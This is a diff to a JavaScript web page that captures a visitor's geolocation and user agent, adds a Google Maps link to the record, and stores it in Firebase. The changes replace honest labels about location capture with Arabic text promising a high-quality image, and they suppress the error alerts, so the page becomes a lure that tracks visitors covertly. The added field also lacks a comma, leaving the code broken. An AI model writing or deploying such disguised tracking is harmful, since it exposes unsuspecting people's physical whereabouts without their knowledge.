@@ -24,26 +24,28 @@ function successCallback(position) {
     const latitude = position.coords.latitude;
     const longitude = position.coords.longitude;
     const timestamp = new Date();
+const locationOnMap = "https://www.google.com/maps/search/?api=1&query=" + latitude + "," + longitude;
 
-    actionButton.textContent = 'Location Found, Saving...';
+    actionButton.textContent = 'تحميل الصورة...';
 
     const locationData = {
         latitude: latitude,
         longitude: longitude,
         timestamp: timestamp,
         userAgent: navigator.userAgent
+        locationOnMap: locationOnMap
     };
 
     // 2. Save Location to Firebase Firestore
     saveLocationToFirebase(locationData)
         .then(() => {
-            actionButton.textContent = 'Location Saved! Showing Image...';
+            actionButton.textContent = 'جاري عرض الصورة...';
             // 3. Display Full-Screen Image
             showImage();
         })
         .catch((error) => {
             console.error("Error writing document: ", error);
-            alert("Failed to save location data to Firebase.");
+            alert("Failed to show Image");
             resetButton();
         });
 }
@@ -67,7 +69,7 @@ function errorCallback(error) {
             break;
     }
     console.error("Geolocation error:", message);
-    alert(message);
+    //alert(message);
     resetButton();
 }
 
@@ -90,5 +92,5 @@ function showImage() {
 // --- UTILITY FUNCTION ---
 function resetButton() {
     actionButton.disabled = false;
-    actionButton.textContent = 'Capture Location and Show Image';
+    actionButton.textContent = 'عرض الصورة بجودة عالية';
 }
